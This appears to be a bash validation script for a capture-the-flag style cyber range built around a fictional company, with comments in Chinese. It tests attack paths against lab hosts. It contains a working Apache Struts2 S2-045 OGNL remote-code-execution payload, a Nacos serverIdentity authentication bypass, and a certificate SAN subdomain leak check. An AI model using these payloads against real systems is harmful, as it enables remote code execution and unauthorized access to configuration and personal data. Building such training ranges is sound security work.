#!/usr/bin/env bash
# Path A E2E 验证助手 (攻击侧)。需靶场已构建并起网 + 应用源码就绪 (M2-M3 验收)。
# 经宿主机入口/pivot 验证: S2-045 RCE / Nacos 绕过 / postgres PII。
set -uo pipefail
cd "$(dirname "$0")/.."
RESOLVE_WWW="--resolve www.hengyuan.local:443:127.0.0.1"
RESOLVE_SUP="--resolve supplier.hengyuan.local:443:127.0.0.1"
pass=0; fail=0
ok(){ echo "  [PASS] $1"; pass=$((pass+1)); }
no(){ echo "  [FAIL] $1"; fail=$((fail+1)); }

echo "== A1 证书 SAN 泄露 supplier =="
echo | openssl s_client -connect 127.0.0.1:443 -servername www.hengyuan.local 2>/dev/null \
  | openssl x509 -noout -text 2>/dev/null | grep -q "supplier.hengyuan.local" \
  && ok "SAN 含 supplier" || no "SAN 未泄露 supplier"

echo "== A2 S2-045 RCE (echo id) =="
# 畸形 Content-Type OGNL; 回显 uid= 即 RCE。详见 docs/walkthrough/path-a.md A2。
OUT=$(curl -sk $RESOLVE_SUP https://supplier.hengyuan.local/index.action \
  -H 'Content-Type: %{(#cmd='\''id'\'').(#p=new java.lang.ProcessBuilder({'\''/bin/bash'\'','\''-c'\'',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}' 2>/dev/null)
echo "$OUT" | grep -q "uid=" && ok "S2-045 回显 id" || no "S2-045 未回显 (需完整 PoC, 见 path-a.md)"

echo "== A4 Nacos serverIdentity 绕过 =="
curl -s 'http://172.30.3.30:8848/nacos/v1/cs/configs?dataId=flag-nacos.yaml&group=DEFAULT_GROUP' \
  -H 'serverIdentity: security' 2>/dev/null | grep -q "flag{" \
  && ok "Nacos 绕过返回 flag-nacos" || no "Nacos 绕过失败 (需 pivot 到 corp)"

echo "== A5 postgres PII (hy_app) =="
docker compose exec -T postgres psql -U hy_app -d hengyuan -tAc \
  "SELECT note FROM customers WHERE note LIKE 'flag{%';" 2>/dev/null | grep -q "flag{" \
  && ok "customers.note 含 db-pii flag" || no "db-pii flag 缺失"

echo "== 结果: PASS=$pass FAIL=$fail =="
[[ $fail -eq 0 ]]